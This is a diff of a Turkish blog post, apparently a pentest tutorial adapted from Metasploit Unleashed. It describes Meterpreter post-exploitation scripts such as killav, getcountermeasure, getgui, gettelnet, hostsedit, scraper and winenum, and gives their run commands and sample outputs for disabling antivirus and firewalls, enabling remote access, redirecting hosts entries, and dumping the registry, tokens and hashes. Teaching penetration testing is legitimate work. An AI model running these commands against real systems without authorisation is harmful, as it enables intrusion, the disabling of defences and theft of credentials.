@@ -5,7 +5,7 @@ date: 2017-06-14 09:00:06.000000000 +02:00
 type: post
 author: siberoloji
 img: metasploit.jpg
-published: false
+published: true
 status: publish
 categories:
 - Nasıl
@@ -13,54 +13,43 @@ categories:
 tags:
 - msfconsole
 - metasploit Framework
-- Metasploit Framework timestomp
-- msf meterpreter timestomp
+- Metasploit Framework scripting
+- msf meterpreter scripting
 
-excerpt: Herhangi bir sistemde pentest yapmak, o sistemle etkileşime girmeyi gerektirir. Gerçekleştirdiğiniz her işlemde, hedef sistemde izler bırakırsınız. Bu bıraktığınız izleri incelemek **forensics** araştırmacılarının dikkatini çeker. Dosyaların zaman damgaları bunlardan bir tanesidir. Bırakılan bu izleri temizlemek veya en azından karıştırmak için Meterpreter ```timestomp``` adı verilen bir komut sağlamaktadır.
+excerpt: Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.
 ---
 
-Meterpreter Scripting
-One of the most powerful features of Meterpreter is the versatility and ease of adding additional features. This is accomplished through the Meterpreter scripting environment. This section will cover the automation of tasks in a Meterpreter session through the use of this scripting environment, how you can take advantage of Meterpreter scripting, and how to write your own scripts to solve your unique needs.
+# Meterpreter Scripting
 
-Before diving right in, it is worth covering a few items. Like the rest of the Metasploit framework, the scripts we will be dealing with are written in Ruby and located in the main Metasploit directory in scripts/meterpreter. If you are not familiar with Ruby, a great resource for learning it is the online book “Programming Ruby”.
+Meterpreter komut satırının güçlü yönlerinden bir tanesi de çok yönlülük ve dışarıdan başka script kodlarının kolayca adapte edilebilmesidir. Bu yazıda, Meterpreter içinde öncelikle mevcut kodların neler olduğunu göreceğiz. Ardından ilerleyen yazılarda, ihtiyaca göre kendi script kodlarımızı oluşturmayı göreceğiz.
 
-Before starting, please take a few minutes to review the current subversion repository of Meterpreter scripts. This is a great resource to use to see how others are approaching problems, and possibly borrow code that may be of use to you.
+Metasploit Framework sisteminin tamamında olduğu gibi Meterpreter script kodları da Ruby programlama diliyle yazılmaktadır. Ruby hakkında yeterli bilgi sahibi değilseniz, [Ruby Programlama](http://ruby-doc.org/docs/ProgrammingRuby/) web sitesini bir miktar incelemenizi tavsiye ediyorum.
 
-Existing Scripts
-Metasploit Scripts
+Metasploit Framework içerisinde mevcut bulunan scriptleri incelemek isterseniz, [Github](https://www.offensive-security.com/metasploit-unleashed/existing-scripts/) adresini inceleyebilirsiniz. Mevcut scriptlerin incelenmesi bizim çok işimize yarayacaktır. Muhtemelen, sizin yapmak istediğiniz işleme ait bir örnek kod parçası mevcut scriptlerin içinde bulunmaktadır. Buradan istediğiniz kod bölümünü alarak kullanmak en mantıklı yaklaşım olacaktır.
 
-Metasploit comes with a ton of useful scripts that can aid you in the Metasploit Framework. These scripts are typically made by third parties and eventually adopted into the subversion repository. We’ll run through some of them and walk you through how you can use them in your own penetration test.
 
-The scripts mentioned below are intended to be used with a Meterpreter shell after the successful compromise of a target. Once you have gained a session with the target you can utilize these scripts to best suit your needs.
+# Mevcut Scriptler
 
-Contents
+Aşağıda, bir kaç script örneği ve ne gibi işlemler yaptığı açıklanmıştır. Bu doğrultuda Ruby kodlarını inceleyebilirsiniz. 
 
-1 checkvm
-2 getcountermeasure
-3 getgui
-4 get_local_subnets
-5 gettelnet
-6 hostsedit
-7 killav
-8 remotewinenum
-9 scraper
-10 winenum
- 
+> Meterpreter scriptlerinin kullanımı için, hedef sistemde bir şekilde Meterpreter oturumu açmış olmanız gerekmektedir. Anlatımlarda, oturum açtığınız kabul edilmiştir.
 
-checkvm
+## checkvm
 
-The ‘checkvm’ script, as its name suggests, checks to see if you exploited a virtual machine. This information can be very useful.
+```checkvm``` scripti, adından da anlaşılacağı gibi, oturumu bir sanal makinede oturum açıp açmadığınızı kontrol etmekte kullanılır.
 
+```sh
  meterpreter > run checkvm  
  
  [*] Checking if SSHACKTHISBOX-0 is a Virtual Machine ........
  [*] This is a VMware Workstation/Fusion Virtual Machine
- 
+``` 
 
-getcountermeasure
+## getcountermeasure
 
-The ‘getcountermeasure’ script checks the security configuration on the victims system and can disable other security measures such as A/V, Firewall, and much more.
+```getcountermeasure``` scripti, hedef sistemin güvenlik bilgisini görmeyi sağlar. Antivirüs veya Firewall u devre dışı bırakmanıza yardım eder.
 
+```sh
  meterpreter > run getcountermeasure 
  
  [*] Running Getcountermeasure on the target... 
@@ -82,12 +71,13 @@ The ‘getcountermeasure’ script checks the security configuration on the vict
  [*]     Operational mode                  = Disable
  [*]    
  [*] Checking DEP Support Policy...
- 
+``` 
 
-getgui
+## getgui
 
-The ‘getgui’ script is used to enable RDP on a target system if it is disabled.
+```getgui``` scripti, hedef bilgisayarda RDP özelliği kapalıysa açmayı sağlar.
 
+```sh
  meterpreter > run getgui 
 
 [!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
@@ -113,22 +103,25 @@ OPTIONS:
  [*] Setting Terminal Services service startup mode
  [*] Terminal Services service is already set to auto
  [*] Opening port in local firewall if necessary
- 
+```
 
-get_local_subnets
+## get_local_subnets
 
-The ‘get_local_subnets’ script is used to get the local subnet mask of a victim. This can be very useful information to have for pivoting.
 
- meterpreter > run get_local_subnets 
- 
- Local subnet: 10.211.55.0/255.255.255.0
- 
+```get_local_subnets``` scripti, hedef bilgisayarın yerel subnet bilgilerini elde etmeyi sağlar. Bu bilgiler pivoting işlemlerinde kullanılabilir.
 
-gettelnet
+```sh
+meterpreter > run get_local_subnets 
 
-The ‘gettelnet’ script is used to enable telnet on the victim if it is disabled.
+Local subnet: 10.211.55.0/255.255.255.0
+```
 
- meterpreter > run gettelnet 
+## gettelnet
+
+```gettelnet``` scripti, hedef bilgisayarda telnet özeliği kapalıysa, açmaya yarar.
+
+```sh
+meterpreter > run gettelnet 
 Windows Telnet Server Enabler Meterpreter Script
 Usage: gettelnet -u  -p 
 
@@ -140,18 +133,19 @@ OPTIONS:
     -p   The Password of the user to add.
     -u   The Username of the user to add.
  
- meterpreter > run gettelnet -e
- 
- [*] Windows Telnet Server Enabler Meterpreter Script
- [*] Setting Telnet Server Services service startup mode
- [*] The Telnet Server Services service is not set to auto, changing it to auto ...
- [*] Opening port in local firewall if necessary
- 
+meterpreter > run gettelnet -e
 
-hostsedit
+[*] Windows Telnet Server Enabler Meterpreter Script
+[*] Setting Telnet Server Services service startup mode
+[*] The Telnet Server Services service is not set to auto, changing it to auto ...
+[*] Opening port in local firewall if necessary
+``` 
 
-The ‘hostsedit’ Meterpreter script is for adding entries to the Windows hosts file. Since Windows will check the hosts file first instead of the configured DNS server, it will assist in diverting traffic to a fake entry or entries. Either a single entry can be provided or a series of entries can be provided with a file containing one entry per line.
+## hostsedit
 
+```hostsedit``` scripti, Windows hosts dosyasına bilgi girmeye yarar. Bağlanılmak istenen web adreslerinin DNS adresleri için önce bu hosts dosyasına bakılır. Hedef bilgisayarı istenen adrese yönlendirmek için kullanılır. Her satıra bir adres girilmelidir.
+
+```sh
 meterpreter > run hostsedit 
 
 [!] Meterpreter scripts are deprecated. Try post/windows/manage/inject_host.
@@ -179,22 +173,24 @@ run hostsedit -l /tmp/fakednsentries.txt
  [*] Backup loacated in C:\WINDOWS\System32\drivers\etc\hosts62497.back
  [*] Adding Record for Host www.microsoft.com with IP 10.211.55.162
  [*] Clearing the DNS Cache
- 
+``` 
 
-killav
+## killav
 
-The ‘killav’ script can be used to disable most antivirus programs running as a service on a target.
+```killav``` scripti, sistemde bir servis olarak çalışan Antivirüs programlarını devre dışı bırakmada kullanılır.
 
+```sh
  meterpreter > run killav 
  
  [*] Killing Antivirus services on the target...
  [*] Killing off cmd.exe...
- 
+```
 
-remotewinenum
+## remotewinenum
 
-The ‘remotewinenum’ script will enumerate system information through wmic on victim. Make note of where the logs are stored.
+```remotewinenum``` scripti, hedef sistem hakkında bilgi etmek için kullanılır.
 
+```sh
 meterpreter > run remotewinenum
 
 [!] Meterpreter scripts are deprecated. Try post/windows/gather/wmic_command.
@@ -236,12 +232,13 @@ OPTIONS:
  [*]     running command wimic rdtoggle list
  [*]     running command wimic product get name,version
  [*]     running command wimic qfe list
- 
+``` 
 
-scraper
+## scraper
 
-The ‘scraper’ script can grab even more system information, including the entire registry.
+```scraper``` scripti, ```remotewinenum``` ile elde edilen bilgiden daha fazlasını elde etmeye yarar. Elde edilen bilgilerin içinde registry kayıtları da bulunur.
 
+```sh
 meterpreter > run scraper
  
  [*] New session on 10.211.55.128:4444...
@@ -253,12 +250,15 @@ meterpreter > run scraper
  [*] Cleaning HKCU
  [*] Exporting HKLM
  [*] Downloading HKLM (C:\WINDOWS\TEMP\GHMUdVWt.reg)
-From our examples above we can see that there are plenty of Meterpreter scripts for us to enumerate a ton of information, disable anti-virus for us, enable RDP, and much much more.
+```
 
-winenum
+Yukarıdaki örneklerde görüldüğü gibi, Meterpreter script kodlarıyla oldukça detaylı bilgi toplanabilmektedir. Bunun yanında Antivirüs veya Firewall iptal etmede de kullanılmaktadır.
 
-The ‘winenum’ script makes for a very detailed windows enumeration tool. It dumps tokens, hashes and much more.
+## winenum
 
+```winenum``` scripti, sistem hakkında en detaylı bilgiyi elde etmede kullanılabilir. Token, hash bilgileri ve diğer tüm bilgileri ```winenum``` scripti ile görebilirsiniz.
+
+```sh
 meterpreter > run winenum 
  
  [*] Running Windows Local Enumerion Meterpreter Script
@@ -315,3 +315,4 @@ meterpreter > run winenum
  [*] Getting Tokens...
  [*] All tokens have been processed
  [*] Done!
+ ```
